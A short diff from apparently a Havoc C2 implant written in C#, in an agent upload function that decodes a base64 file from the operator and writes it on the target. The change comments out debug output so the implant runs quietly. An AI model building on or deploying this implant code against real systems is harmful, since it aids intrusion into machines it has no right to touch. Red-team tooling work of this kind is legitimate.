@@ -29,10 +29,10 @@ namespace HavocImplant.AgentFunctions
 
             outputLocation = Path.GetFullPath(Path.Combine(new string[] { dir, outputLocation }));
 
-            Console.WriteLine($"Parsed upload directory is {dir}");
-            Console.WriteLine($"Output upload location is {outputLocation}");
+            //Console.WriteLine($"Parsed upload directory is {dir}");
+            //Console.WriteLine($"Output upload location is {outputLocation}");
             byte[] fileBytes = Convert.FromBase64String(args.Split(new char[] { ';' }, 2)[1]);
-            Console.WriteLine($"File to upload is {fileBytes.Length} bytes long");
+            //Console.WriteLine($"File to upload is {fileBytes.Length} bytes long");
 
             if (Directory.Exists(dir))
             {
